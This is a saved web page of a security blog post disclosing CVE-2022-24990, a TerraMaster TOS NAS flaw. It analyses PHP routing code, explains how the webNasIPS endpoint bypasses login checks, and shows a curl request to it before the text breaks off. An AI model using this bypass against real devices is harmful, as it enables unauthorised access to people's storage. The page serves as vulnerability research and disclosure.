<!DOCTYPE html>
<html lang="en-US">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<link rel="profile" href="http://gmpg.org/xfn/11">
<link rel="pingback" href="https://octagon.net/blog/xmlrpc.php">
<title>CVE-2022-24990: TerraMaster TOS unauthenticated remote command execution via PHP Object Instantiation &#8211; Blog | Octagon Networks</title>
<meta name='robots' content='max-image-preview:large' />
<link rel='dns-prefetch' href='//fonts.googleapis.com' />
<link rel="alternate" type="application/rss+xml" title="Blog | Octagon Networks &raquo; Feed" href="https://octagon.net/blog/feed/" />
<link rel="alternate" type="application/rss+xml" title="Blog | Octagon Networks &raquo; Comments Feed" href="https://octagon.net/blog/comments/feed/" />
<link rel="alternate" type="application/rss+xml" title="Blog | Octagon Networks &raquo; CVE-2022-24990: TerraMaster TOS unauthenticated remote command execution via PHP Object Instantiation Comments Feed" href="https://octagon.net/blog/2022/03/07/cve-2022-24990-terrmaster-tos-unauthenticated-remote-command-execution-via-php-object-instantiation/feed/" />
<script type="text/javascript">
/* <![CDATA[ */
window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/15.0.3\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/15.0.3\/svg\/","svgExt":".svg","source":{"concatemoji":"https:\/\/octagon.net\/blog\/wp-includes\/js\/wp-emoji-release.min.js?ver=6.6.2"}};
/*! This file is auto-generated */
!function(i,n){var o,s,e;function c(e){try{var t={supportTests:e,timestamp:(new Date).valueOf()};sessionStorage.setItem(o,JSON.stringify(t))}catch(e){}}function p(e,t,n){e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(t,0,0);var t=new Uint32Array(e.getImageData(0,0,e.canvas.width,e.canvas.height).data),r=(e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(n,0,0),new Uint32Array(e.getImageData(0,0,e.canvas.width,e.canvas.height).data));return t.every(function(e,t){return e===r[t]})}function u(e,t,n){switch(t){case"flag":return n(e,"\ud83c\udff3\ufe0f\u200d\u26a7\ufe0f","\ud83c\udff3\ufe0f\u200b\u26a7\ufe0f")?!1:!n(e,"\ud83c\uddfa\ud83c\uddf3","\ud83c\uddfa\u200b\ud83c\uddf3")&&!n(e,"\ud83c\udff4\udb40\udc67\udb40\udc62\udb40\udc65\udb40\udc6e\udb40\udc67\udb40\udc7f","\ud83c\udff4\u200b\udb40\udc67\u200b\udb40\udc62\u200b\udb40\udc65\u200b\udb40\udc6e\u200b\udb40\udc67\u200b\udb40\udc7f");case"emoji":return!n(e,"\ud83d\udc26\u200d\u2b1b","\ud83d\udc26\u200b\u2b1b")}return!1}function f(e,t,n){var r="undefined"!=typeof WorkerGlobalScope&&self instanceof WorkerGlobalScope?new OffscreenCanvas(300,150):i.createElement("canvas"),a=r.getContext("2d",{willReadFrequently:!0}),o=(a.textBaseline="top",a.font="600 32px Arial",{});return e.forEach(function(e){o[e]=t(a,e,n)}),o}function t(e){var t=i.createElement("script");t.src=e,t.defer=!0,i.head.appendChild(t)}"undefined"!=typeof Promise&&(o="wpEmojiSettingsSupports",s=["flag","emoji"],n.supports={everything:!0,everythingExceptFlag:!0},e=new Promise(function(e){i.addEventListener("DOMContentLoaded",e,{once:!0})}),new Promise(function(t){var n=function(){try{var e=JSON.parse(sessionStorage.getItem(o));if("object"==typeof e&&"number"==typeof e.timestamp&&(new Date).valueOf()<e.timestamp+604800&&"object"==typeof e.supportTests)return e.supportTests}catch(e){}return null}();if(!n){if("undefined"!=typeof Worker&&"undefined"!=typeof OffscreenCanvas&&"undefined"!=typeof URL&&URL.createObjectURL&&"undefined"!=typeof Blob)try{var e="postMessage("+f.toString()+"("+[JSON.stringify(s),u.toString(),p.toString()].join(",")+"));",r=new Blob([e],{type:"text/javascript"}),a=new Worker(URL.createObjectURL(r),{name:"wpTestEmojiSupports"});return void(a.onmessage=function(e){c(n=e.data),a.terminate(),t(n)})}catch(e){}c(n=f(s,u,p))}t(n)}).then(function(e){for(var t in e)n.supports[t]=e[t],n.supports.everything=n.supports.everything&&n.supports[t],"flag"!==t&&(n.supports.everythingExceptFlag=n.supports.everythingExceptFlag&&n.supports[t]);n.supports.everythingExceptFlag=n.supports.everythingExceptFlag&&!n.supports.flag,n.DOMReady=!1,n.readyCallback=function(){n.DOMReady=!0}}).then(function(){return e}).then(function(){var e;n.supports.everything||(n.readyCallback(),(e=n.source||{}).concatemoji?t(e.concatemoji):e.wpemoji&&e.twemoji&&(t(e.twemoji),t(e.wpemoji)))}))}((window,document),window._wpemojiSettings);
/* ]]> */
</script>
<style id='wp-emoji-styles-inline-css' type='text/css'>

	img.wp-smiley, img.emoji {
		display: inline !important;
		border: none !important;
		box-shadow: none !important;
		height: 1em !important;
		width: 1em !important;
		margin: 0 0.07em !important;
		vertical-align: -0.1em !important;
		background: none !important;
		padding: 0 !important;
	}
</style>
<link rel='stylesheet' id='wp-block-library-css' href='https://octagon.net/blog/wp-includes/css/dist/block-library/style.min.css?ver=6.6.2' type='text/css' media='all' />
<style id='classic-theme-styles-inline-css' type='text/css'>
/*! This file is auto-generated */
.wp-block-button__link{color:#fff;background-color:#32373c;border-radius:9999px;box-shadow:none;text-decoration:none;padding:calc(.667em + 2px) calc(1.333em + 2px);font-size:1.125em}.wp-block-file__button{background:#32373c;color:#fff;text-decoration:none}
</style>
<style id='global-styles-inline-css' type='text/css'>
:root{--wp--preset--aspect-ratio--square: 1;--wp--preset--aspect-ratio--4-3: 4/3;--wp--preset--aspect-ratio--3-4: 3/4;--wp--preset--aspect-ratio--3-2: 3/2;--wp--preset--aspect-ratio--2-3: 2/3;--wp--preset--aspect-ratio--16-9: 16/9;--wp--preset--aspect-ratio--9-16: 9/16;--wp--preset--color--black: #000000;--wp--preset--color--cyan-bluish-gray: #abb8c3;--wp--preset--color--white: #ffffff;--wp--preset--color--pale-pink: #f78da7;--wp--preset--color--vivid-red: #cf2e2e;--wp--preset--color--luminous-vivid-orange: #ff6900;--wp--preset--color--luminous-vivid-amber: #fcb900;--wp--preset--color--light-green-cyan: #7bdcb5;--wp--preset--color--vivid-green-cyan: #00d084;--wp--preset--color--pale-cyan-blue: #8ed1fc;--wp--preset--color--vivid-cyan-blue: #0693e3;--wp--preset--color--vivid-purple: #9b51e0;--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple: linear-gradient(135deg,rgba(6,147,227,1) 0%,rgb(155,81,224) 100%);--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan: linear-gradient(135deg,rgb(122,220,180) 0%,rgb(0,208,130) 100%);--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange: linear-gradient(135deg,rgba(252,185,0,1) 0%,rgba(255,105,0,1) 100%);--wp--preset--gradient--luminous-vivid-orange-to-vivid-red: linear-gradient(135deg,rgba(255,105,0,1) 0%,rgb(207,46,46) 100%);--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray: linear-gradient(135deg,rgb(238,238,238) 0%,rgb(169,184,195) 100%);--wp--preset--gradient--cool-to-warm-spectrum: linear-gradient(135deg,rgb(74,234,220) 0%,rgb(151,120,209) 20%,rgb(207,42,186) 40%,rgb(238,44,130) 60%,rgb(251,105,98) 80%,rgb(254,248,76) 100%);--wp--preset--gradient--blush-light-purple: linear-gradient(135deg,rgb(255,206,236) 0%,rgb(152,150,240) 100%);--wp--preset--gradient--blush-bordeaux: linear-gradient(135deg,rgb(254,205,165) 0%,rgb(254,45,45) 50%,rgb(107,0,62) 100%);--wp--preset--gradient--luminous-dusk: linear-gradient(135deg,rgb(255,203,112) 0%,rgb(199,81,192) 50%,rgb(65,88,208) 100%);--wp--preset--gradient--pale-ocean: linear-gradient(135deg,rgb(255,245,203) 0%,rgb(182,227,212) 50%,rgb(51,167,181) 100%);--wp--preset--gradient--electric-grass: linear-gradient(135deg,rgb(202,248,128) 0%,rgb(113,206,126) 100%);--wp--preset--gradient--midnight: linear-gradient(135deg,rgb(2,3,129) 0%,rgb(40,116,252) 100%);--wp--preset--font-size--small: 13px;--wp--preset--font-size--medium: 20px;--wp--preset--font-size--large: 36px;--wp--preset--font-size--x-large: 42px;--wp--preset--spacing--20: 0.44rem;--wp--preset--spacing--30: 0.67rem;--wp--preset--spacing--40: 1rem;--wp--preset--spacing--50: 1.5rem;--wp--preset--spacing--60: 2.25rem;--wp--preset--spacing--70: 3.38rem;--wp--preset--spacing--80: 5.06rem;--wp--preset--shadow--natural: 6px 6px 9px rgba(0, 0, 0, 0.2);--wp--preset--shadow--deep: 12px 12px 50px rgba(0, 0, 0, 0.4);--wp--preset--shadow--sharp: 6px 6px 0px rgba(0, 0, 0, 0.2);--wp--preset--shadow--outlined: 6px 6px 0px -3px rgba(255, 255, 255, 1), 6px 6px rgba(0, 0, 0, 1);--wp--preset--shadow--crisp: 6px 6px 0px rgba(0, 0, 0, 1);}:where(.is-layout-flex){gap: 0.5em;}:where(.is-layout-grid){gap: 0.5em;}body .is-layout-flex{display: flex;}.is-layout-flex{flex-wrap: wrap;align-items: center;}.is-layout-flex > :is(*, div){margin: 0;}body .is-layout-grid{display: grid;}.is-layout-grid > :is(*, div){margin: 0;}:where(.wp-block-columns.is-layout-flex){gap: 2em;}:where(.wp-block-columns.is-layout-grid){gap: 2em;}:where(.wp-block-post-template.is-layout-flex){gap: 1.25em;}:where(.wp-block-post-template.is-layout-grid){gap: 1.25em;}.has-black-color{color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-color{color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-color{color: var(--wp--preset--color--white) !important;}.has-pale-pink-color{color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-color{color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-color{color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-color{color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-color{color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-color{color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-color{color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-color{color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-color{color: var(--wp--preset--color--vivid-purple) !important;}.has-black-background-color{background-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-background-color{background-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-background-color{background-color: var(--wp--preset--color--white) !important;}.has-pale-pink-background-color{background-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-background-color{background-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-background-color{background-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-background-color{background-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-background-color{background-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-background-color{background-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-background-color{background-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-background-color{background-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-background-color{background-color: var(--wp--preset--color--vivid-purple) !important;}.has-black-border-color{border-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-border-color{border-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-border-color{border-color: var(--wp--preset--color--white) !important;}.has-pale-pink-border-color{border-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-border-color{border-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-border-color{border-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-border-color{border-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-border-color{border-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-border-color{border-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-border-color{border-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-border-color{border-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-border-color{border-color: var(--wp--preset--color--vivid-purple) !important;}.has-vivid-cyan-blue-to-vivid-purple-gradient-background{background: var(--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple) !important;}.has-light-green-cyan-to-vivid-green-cyan-gradient-background{background: var(--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan) !important;}.has-luminous-vivid-amber-to-luminous-vivid-orange-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange) !important;}.has-luminous-vivid-orange-to-vivid-red-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-orange-to-vivid-red) !important;}.has-very-light-gray-to-cyan-bluish-gray-gradient-background{background: var(--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray) !important;}.has-cool-to-warm-spectrum-gradient-background{background: var(--wp--preset--gradient--cool-to-warm-spectrum) !important;}.has-blush-light-purple-gradient-background{background: var(--wp--preset--gradient--blush-light-purple) !important;}.has-blush-bordeaux-gradient-background{background: var(--wp--preset--gradient--blush-bordeaux) !important;}.has-luminous-dusk-gradient-background{background: var(--wp--preset--gradient--luminous-dusk) !important;}.has-pale-ocean-gradient-background{background: var(--wp--preset--gradient--pale-ocean) !important;}.has-electric-grass-gradient-background{background: var(--wp--preset--gradient--electric-grass) !important;}.has-midnight-gradient-background{background: var(--wp--preset--gradient--midnight) !important;}.has-small-font-size{font-size: var(--wp--preset--font-size--small) !important;}.has-medium-font-size{font-size: var(--wp--preset--font-size--medium) !important;}.has-large-font-size{font-size: var(--wp--preset--font-size--large) !important;}.has-x-large-font-size{font-size: var(--wp--preset--font-size--x-large) !important;}
:where(.wp-block-post-template.is-layout-flex){gap: 1.25em;}:where(.wp-block-post-template.is-layout-grid){gap: 1.25em;}
:where(.wp-block-columns.is-layout-flex){gap: 2em;}:where(.wp-block-columns.is-layout-grid){gap: 2em;}
:root :where(.wp-block-pullquote){font-size: 1.5em;line-height: 1.6;}
</style>
<link rel='stylesheet' id='templaters-css' href='https://octagon.net/blog/wp-content/plugins/skt-templates/css/templaters.css?ver=6.6.2' type='text/css' media='all' />
<link rel='stylesheet' id='skt-secure-font-css' href='//fonts.googleapis.com/css?family=Roboto+Condensed%3A300%2C400%2C600%2C700%2C800%2C900%7CRoboto%3A100%2C100i%2C300%2C300i%2C400%2C400i%2C500%2C500i%2C700%2C700i%2C900%2C900i%7CAssistant%3A200%2C300%2C400%2C600%2C700%2C800%7CAnton%3A400%7CPlayfair+Display%3A400%2C400i%2C700%2C700i%2C900%2C900i%7COswald%3A200%2C300%2C400%2C500%2C600%2C700%7CFira+Sans%3A200%2C200i%2C300%2C300i%2C400%2C400i%2C500%2C500i%2C600%2C600i%2C700%2C700i%2C800%2C800i%2C900%2C900i&#038;ver=6.6.2' type='text/css' media='all' />
<link rel='stylesheet' id='skt-secure-basic-style-css' href='https://octagon.net/blog/wp-content/themes/skt-secure/style.css?ver=6.6.2' type='text/css' media='all' />
<link rel='stylesheet' id='skt-secure-main-style-css' href='https://octagon.net/blog/wp-content/themes/skt-secure/css/responsive.css?ver=6.6.2' type='text/css' media='all' />
<link rel='stylesheet' id='skt-secure-editor-style-css' href='https://octagon.net/blog/wp-content/themes/skt-secure/editor-style.css?ver=6.6.2' type='text/css' media='all' />
<link rel='stylesheet' id='skt-secure-animation-style-css' href='https://octagon.net/blog/wp-content/themes/skt-secure/css/animation.css?ver=6.6.2' type='text/css' media='all' />
<link rel='stylesheet' id='nivo-slider-css' href='https://octagon.net/blog/wp-content/themes/skt-secure/css/nivo-slider.css?ver=6.6.2' type='text/css' media='all' />
<link rel='stylesheet' id='skt-secure-base-style-css' href='https://octagon.net/blog/wp-content/themes/skt-secure/css/style_base.css?ver=6.6.2' type='text/css' media='all' />
<link rel='stylesheet' id='skt-secure-custom-style-css' href='https://octagon.net/blog/wp-content/themes/skt-secure/css/skt-secure-custom-style.css?ver=6.6.2' type='text/css' media='all' />
<style id='skt-secure-custom-style-inline-css' type='text/css'>

					#sidebar ul li a:hover,
					.footerarea a:hover,
					.cols-3 ul li.current_page_item a,				
					.phone-no strong,					
					.left a:hover,
					.blog_lists h4 a:hover,
					.recent-post h6 a:hover,
					.recent-post a:hover,
					.design-by a,
					.fancy-title h2 span,
					.postmeta a:hover,
					.logo h2,
					.left-fitbox a:hover h3, .right-fitbox a:hover h3, .tagcloud a,
					.blocksbox:hover h3,
					.homefour_section_content h2 span,
					.section5-column:hover h3,
					.cols-3 span,
					.section1top-block-area h2 span,
					.hometwo_section_content h2 span,
					.sitenav ul li a:hover, .sitenav ul li.current_page_item a, .sitenav ul li.menu-item-has-children.hover, .sitenav ul li.current-menu-parent a.parentk,
					.rdmore a
					{ 
						 color: #bf093a !important;
					}
					.pagination .nav-links span.current, .pagination .nav-links a:hover,
					#commentform input#submit:hover,
					.nivo-controlNav a.active,								
					.wpcf7 input[type='submit'],
					a.ReadMore,
					.section2button,
					input.search-submit,
					.recent-post .morebtn:hover, 
					.slide_info .slide_more,
					.sc1-service-box-outer,
					.read-more-btn,
					.sec3col-project-box a
					{ 
					   background-color: #bf093a !important;
					}
					.titleborder span:after, .perf-thumb:before, .cols-3 h5:after{border-bottom-color: #bf093a !important;}
					.perf-thumb:after{border-top-color: #bf093a !important;}
					.nivo-controlNav a.active{border-color: #bf093a !important;}
					
				
</style>
<link rel='stylesheet' id='enlighterjs-css' href='https://octagon.net/blog/wp-content/plugins/enlighter/cache/enlighterjs.min.css?ver=ffyhGmKLYcacg6v' type='text/css' media='all' />
<script type="text/javascript" src="https://octagon.net/blog/wp-includes/js/jquery/jquery.min.js?ver=3.7.1" id="jquery-core-js"></script>
<script type="text/javascript" src="https://octagon.net/blog/wp-includes/js/jquery/jquery-migrate.min.js?ver=3.4.1" id="jquery-migrate-js"></script>
<script type="text/javascript" src="https://octagon.net/blog/wp-content/themes/skt-secure/js/jquery.nivo.slider.js?ver=6.6.2" id="jquery-nivo-js"></script>
<script type="text/javascript" src="https://octagon.net/blog/wp-content/themes/skt-secure/js/custom.js?ver=6.6.2" id="skt-secure-custom-js-js"></script>
<link rel="https://api.w.org/" href="https://octagon.net/blog/wp-json/" /><link rel="alternate" title="JSON" type="application/json" href="https://octagon.net/blog/wp-json/wp/v2/posts/173" /><link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://octagon.net/blog/xmlrpc.php?rsd" />
<meta name="generator" content="WordPress 6.6.2" />
<link rel="canonical" href="https://octagon.net/blog/2022/03/07/cve-2022-24990-terrmaster-tos-unauthenticated-remote-command-execution-via-php-object-instantiation/" />
<link rel='shortlink' href='https://octagon.net/blog/?p=173' />
<link rel="alternate" title="oEmbed (JSON)" type="application/json+oembed" href="https://octagon.net/blog/wp-json/oembed/1.0/embed?url=https%3A%2F%2Foctagon.net%2Fblog%2F2022%2F03%2F07%2Fcve-2022-24990-terrmaster-tos-unauthenticated-remote-command-execution-via-php-object-instantiation%2F" />
<link rel="alternate" title="oEmbed (XML)" type="text/xml+oembed" href="https://octagon.net/blog/wp-json/oembed/1.0/embed?url=https%3A%2F%2Foctagon.net%2Fblog%2F2022%2F03%2F07%2Fcve-2022-24990-terrmaster-tos-unauthenticated-remote-command-execution-via-php-object-instantiation%2F&#038;format=xml" />
<link rel="pingback" href="https://octagon.net/blog/xmlrpc.php">
	<style type="text/css">
		
	</style>
	<link rel="icon" href="https://octagon.net/blog/wp-content/uploads/2022/01/octicon.png" sizes="32x32" />
<link rel="icon" href="https://octagon.net/blog/wp-content/uploads/2022/01/octicon.png" sizes="192x192" />
<link rel="apple-touch-icon" href="https://octagon.net/blog/wp-content/uploads/2022/01/octicon.png" />
<meta name="msapplication-TileImage" content="https://octagon.net/blog/wp-content/uploads/2022/01/octicon.png" />
		<style type="text/css" id="wp-custom-css">
			div.nav-next a, div.nav-previous a {
	transition: color 400ms ease;
}
div.nav-next a:hover, div.nav-previous a:hover {
	color: #bf093a;
}

a:not(.footer_link,.header_menu_link),p {
	#font-weight: 600 !important;
	letter-spacing: .8px;
}
button.wp-block-search__button {
	background: #c91111;
	color: white;
	transition: background 300ms ease-in-out;
	font-weight: 600;
	letter-spacing: 1px;
	cursor: pointer;
	border-radius: 5px;
}

button.wp-block-search__button:hover,
a.ReadMore:hover {
	background: black !important;
}
/* Classes for flex container */
.flex {
  display: flex;
}

/* Classes for aligning items at the center vertically */
.items-center {
  align-items: center;
}

/* Classes for centering content horizontally */
.justify-center {
  justify-content: center;
}

/* Classes for full width */
.w-full {
  width: 100%;
}
		</style>
		</head>
<body class="post-template-default single single-post postid-173 single-format-standard wp-custom-logo">
<div class="header">
  <div class="container">
	<!--HEADER INFO AREA STARTS-->
<!--HEADER INFO AREA ENDS-->
	<div class="clear"></div> 
<a href="https://octagon.net/blog/"><img src="/imgs/oct.png" style="max-width: 20rem;margin-top:.5rem;" alt=""></a>
    <div id="topmenu">
    	         <div class="toggle"><a class="toggleMenu" href="#" style="display:none;">Menu</a></div> 
        <div class="sitenav">
          <div class="menu-octmenu-container"><ul id="menu-octmenu" class="menu"><li id="menu-item-55" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-55"><a href="https://www.octagon.net/about">About</a></li>
<li id="menu-item-54" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-54"><a href="https://www.octagon.net/contact">Contact Us</a></li>
</ul></div>         
        </div><!-- .sitenav--> 
    </div>
  </div> <!-- container -->
  <div class="clear"></div>
</div><!--.header -->
<div class="clear"></div><div class="container">
     <div class="page_content">
        <section class="site-main">            
                <article id="post-173" class="single-post post-173 post type-post status-publish format-standard hentry category-uncategorized">
    <header class="entry-header">
        <h1 class="single_title">CVE-2022-24990: TerraMaster TOS unauthenticated remote command execution via PHP Object Instantiation</h1>
    </header><!-- .entry-header -->
     <div class="postmeta">
            <div class="post-date">March 7, 2022</div><!-- post-date -->
            <div class="post-comment"> &nbsp;|&nbsp; <a href="https://octagon.net/blog/2022/03/07/cve-2022-24990-terrmaster-tos-unauthenticated-remote-command-execution-via-php-object-instantiation/#respond">No Comments</a></div> 
            <div class="clear"></div>         
    </div><!-- postmeta -->
	    <div class="entry-content">
	<h2>Introduction</h2>
<p>This report explains how researchers at Octagon Networks were able to chain two interesting vulnerabilities to achieve unauthenticated remote command execution as root on TerraMaster NAS devices running TOS version 4.2.29. Patches are distributed for 4.2.31 now.</p>
<h2>Analyzing the PHP files</h2>
<p>After downloading the installation package of the latest TOS package from the official download site and extracting it using binwalk, we can see the platform uses nginx server with PHP scripts. The PHP scripts are encrypted on disk. After decrypting them and analyzing their content, there is an interesting php script &#8211; /usr/www/module/api.php.</p>
<p>The script starts parsing the uri components in the following manner.</p>
<pre class="EnlighterJSRAW" data-enlighter-language="php">$in = router(); 
$URI = $in['URLremote']; 
if (!isset($URI[0]) || $URI[0] == '') 
  $URI[0] = $default_controller; 
if (!isset($URI[1]) || $URI[1] == '') 
  $URI[1] = $default_action; 

define('Module', $URI[0]); 
define('Action', $URI[1]); 
$class = Module; 
$function = Action;</pre>
<p>The <code class="EnlighterJSRAW" data-enlighter-language="php">router</code> function parses the get parameters and assigns them in such a way that if the request is <a href="http://target/module/api.php?XXXX/YYYY">http://target/module/api.php?XXXX/YYYY</a>, then <code class="EnlighterJSRAW" data-enlighter-language="php">$class</code> will be XXXX, and <code class="EnlighterJSRAW" data-enlighter-language="php">$function</code> is YYYY.</p>
<p>It then checks if the function is in an array of <code class="EnlighterJSRAW" data-enlighter-language="php">NO_LOGIN_CHECK</code>, and if it&#8217;s not, it sets <code class="EnlighterJSRAW" data-enlighter-language="php">REQUEST MODE</code> to 1. This will be important detail for the exploit later.</p>
<pre class="EnlighterJSRAW" data-enlighter-language="php">$GLOBALS['NO_LOGIN_CHECK'] = array(
      "webNasIPS", 
      "getDiskList", 
      "createRaid", 
      "getInstallStat", 
      "getIsConfigAdmin", 
      "setAdminConfig", 
      "isConnected"
); 
if (!in_array($function, $GLOBALS['NO_LOGIN_CHECK'])) { 
      define('REQUEST_MODE', 1); 
} else { 
      define('REQUEST_MODE', 0); 
}</pre>
<p>It then instantiates the class stated by <code class="EnlighterJSRAW" data-enlighter-language="php">$class</code> and calls the method stated by <code class="EnlighterJSRAW" data-enlighter-language="php">$function</code>.</p>
<pre class="EnlighterJSRAW" data-enlighter-language="php">$instance = new $class(); 
if (!in_array($function, $class::$notHeader)) { 
 #防止请求重放验证... 
 if (tos_encrypt_str($_SERVER['HTTP_TIMESTAMP']) != $_SERVER['HTTP_SIGNATURE'] || $_SERVER['REQUEST_TIME'] - $_SERVER['HTTP_TIMESTAMP'] &gt; 300) { 
   $instance-&gt;output("Illegal request, timeout!", 0); 
 } 
} $instance-&gt;$function();</pre>
<p>One thing to notice here is that the line <code class="EnlighterJSRAW" data-enlighter-language="php">if (!in_array($function, $class::$notHeader)) {</code>. If our function is not in an array by the name of <code class="EnlighterJSRAW" data-enlighter-language="php">$notHeadeer</code>, then a check will be made. It takes the TIMESTAMP http header and passes it to a function called <code class="EnlighterJSRAW" data-enlighter-language="php">tos_encrypt_str</code>, and compares the output of the function to the value in SIGNATURE http header. It then checks if the timestamp is not older than 5 minutes. The <code class="EnlighterJSRAW" data-enlighter-language="php">tos_encrypt_str</code> is a custom hashing function, which we will come to analyze later to figure out how SIGNATURE is created.</p>
<p>Looking for php scripts which have classes which can be invoked this way, I came across <code class="EnlighterJSRAW" data-enlighter-language="php">/usr/www/include/class/mobile.class.php</code>. To start off, it has two arrays of method name, <code class="EnlighterJSRAW" data-enlighter-language="php">$notCheck</code> and <code class="EnlighterJSRAW" data-enlighter-language="php">$notHeader</code>.</p>
<pre class="EnlighterJSRAW" data-enlighter-language="php">static $notCheck = [ 
        "webNasIPS", "getDiskList", "createRaid", "getInstallStat", 
        "getIsConfigAdmin",  "setAdminConfig", "isConnected", 'createid', 
        'user_create',  'user_bond', 'user_release', 'login', 
        'logout', 'checkCode', "wapNasIPS" 
]; 
//不验证头信息是否匹配... 
static $notHeader = [
        "fileDownload", "videoPlay", "imagesThumb", 
        "imagesView", "fileUpload", "tempClear", 
        "wapNasIPS", "webNasIPS", "isConnected"
];</pre>
<p>Then it makes three check in its constructor.</p>
<pre class="EnlighterJSRAW" data-enlighter-language="php">if (!in_array(Action, self::$notHeader)) { 
    if (!strstr($_SERVER['HTTP_USER_AGENT'], "TNAS") || !isset($_SERVER['HTTP_AUTHORIZATION']) || $this-&gt;REQUESTCODE != $_SERVER['HTTP_AUTHORIZATION']) { 
        $this-&gt;output("Illegal request, please use genuine software!", false); 
    } 
}</pre>
<p>The first check ensures that if the method name invoked is not in <code class="EnlighterJSRAW" data-enlighter-language="php">$notHeader</code> array, it tests whether the user-agent http header is &#8216;TNAS&#8217; and AUTHORIZATION header is equal to <code class="EnlighterJSRAW" data-enlighter-language="php">$this-&gt;REQUESTCODE</code>. Otherwise it exits with an error message. The AUTHORIZATION header will be important later on. For now, let&#8217;s proceed to the second check.</p>
<pre class="EnlighterJSRAW" data-enlighter-language="php">if (REQUEST_MODE) {
   if (!isset($_SESSION)) { 
     $this-&gt;output("session write error!", false); 
   } else { 
     $this-&gt;user = &amp;$_SESSION['kod_user']; 
   } 
   if (isset($this-&gt;in['PHPSESSID'])) { 
     $this-&gt;sessionid = $this-&gt;in['PHPSESSID']; 
   }
}</pre>
<p>if <code class="EnlighterJSRAW" data-enlighter-language="php">REQUEST_MODE</code> is set, then it checks whether the user is logged in. Otherwise it will exit. And the final check:</p>
<pre class="EnlighterJSRAW" data-enlighter-language="php">if (!in_array(Action, self::$notCheck)) { 
     if (!$this-&gt;loginCheck()) { 
          $this-&gt;output("login is timeout", 0); 
     } 
}</pre>
<p>It checks whether the method name is in <code class="EnlighterJSRAW" data-enlighter-language="php">$notCheck</code>, and exits with an error if it&#8217;s not.</p>
<h2>Severe Information Leak: CVE-2022-24990</h2>
<p>So, with the knowledge of the two php script chains, we know that the seven functions &#8220;webNasIPS&#8221;, &#8220;getDiskList&#8221;, &#8220;createRaid&#8221;, &#8220;getInstallStat&#8221;, &#8220;getIsConfigAdmin&#8221;, &#8220;setAdminConfig&#8221;, &#8220;isConnected&#8221; are in <code class="EnlighterJSRAW" data-enlighter-language="php">NO_LOGIN_CHECK</code> array in <code class="EnlighterJSRAW" data-enlighter-language="php">api.php</code>, and will set <code class="EnlighterJSRAW" data-enlighter-language="php">REQUEST_MODE</code> to 0, passing one of the checks in <code class="EnlighterJSRAW" data-enlighter-language="php">mobile.class.php</code>. And upon further checking these functions, <code class="EnlighterJSRAW" data-enlighter-language="php">webNasIPS</code> is the only function which is both in <code class="EnlighterJSRAW" data-enlighter-language="php">$notCheck</code> and <code class="EnlighterJSRAW" data-enlighter-language="php">$notHeader</code> arrays of <code class="EnlighterJSRAW" data-enlighter-language="php">mobile.class.php</code>&#8216;s constructor, which effectively can pass two remaining checks. Let&#8217;s call webNasIPS and see what it returns.</p>
<pre class="EnlighterJSRAW" data-enlighter-language="shell">$ curl -vk 'http://XXXX/module/api.php?mobile/webNasIPS' -H 'User-Agent: TNAS' * Trying XXXX... * Connected to 127.0.0.1 (127.0.0.1) port 22056 (#0) 
&gt; GET /module/api.php?mobile/webNasIPS HTTP/1.1 
&gt; Host: 127.0.0.1:22056 
